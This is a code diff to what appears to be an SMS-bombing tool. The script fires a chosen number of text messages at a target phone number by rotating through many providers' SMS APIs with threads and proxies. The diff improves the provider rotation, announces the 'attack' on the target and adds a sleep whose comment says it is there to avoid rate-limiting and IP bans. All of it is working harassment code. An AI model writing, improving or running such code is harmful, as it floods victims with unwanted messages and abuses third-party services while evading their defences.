@@ -133,26 +133,43 @@ if args.verify:
             if job.result(): success += 1
             else: failed += 1
 else:
+    # Get all available providers for the country
+    available_providers = providers.get(country_code, []) + providers.get("multi", [])
+    random.shuffle(available_providers) # Randomize the order
+    
+    provider_index = 0
+    
+    print(f"[*] Starting attack on {target} using {len(available_providers)} providers...")
+
     while success < no_of_sms:
         with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
             jobs = []
-            for _ in range(no_of_sms - success):
+            
+            # Grab a batch of providers instead of random choice to ensure variety
+            for _ in range(min(no_of_threads, no_of_sms - success)):
+                config = available_providers[provider_index % len(available_providers)]
                 p = APIRequestsHandler(
                     target,
                     proxy=proxies,
                     verbose=args.verbose,
                     timeout=args.timeout,
                     cc=country_code,
-                    config=random.choice(providers[country_code] + providers["multi"] if country_code in providers else providers["multi"]),
+                    config=config,
                 )
                 jobs.append(executor.submit(p.start))
+                provider_index += 1
+
             for job in as_completed(jobs):
                 if job.result():
                     success += 1
                 else:
                     failed += 1
+                
                 if not args.verbose:
-                    print(f"Requests: {success+failed} | Success: {success} | Failed: {failed}", end="\r")
+                    print(f"Requests: {success+failed} | Success: {success} | Failed: {failed}    ", end="\r")
+        
+        # CRITICAL: Small sleep to prevent instant Rate-Limiting/IP Ban
+        time.sleep(1.5)
 
 end = time.time()
 print(f"\nTook {end-start:.2f}s to complete")
